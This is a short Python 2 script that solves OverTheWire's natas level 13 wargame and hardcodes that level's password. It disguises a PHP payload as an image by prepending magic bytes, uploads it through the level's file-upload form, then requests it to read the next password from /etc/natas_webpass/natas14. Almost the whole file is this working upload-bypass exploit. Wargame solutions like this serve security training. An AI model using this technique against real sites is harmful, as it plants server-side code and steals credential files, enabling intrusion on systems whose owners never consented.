#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level13.py
  Solution for natas level13
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 13
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

# Image header 
jpeg_header = [0x00, 0x00, 0x00, 0x0c, 0x6a, 0x50, 0x20, 0x20, 0x0d, 0x0a, 0x87, 0x0a]

def upload_payload():

    _payload = ''.join([chr(i) for i in jpeg_header])
    _payload += r'''<?php
    echo file_get_contents("/etc/natas_webpass/natas14");
   ?>'''

    files = {'uploadedfile': ('payload.php', _payload)}
    data = dict(filename='payload.php')

    r = requests.post(host, auth=(user, password), files=files, data=data)
    filename = re.findall('''(upload/\S{10}.php)''', r.content)[0]
    return filename

def get_flag():

    filename = upload_payload()
    r = requests.get("%s/%s" % (host, filename), auth=(user, password))
    m = re.search(r'([A-Za-z0-9]{30,})', r.text)
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
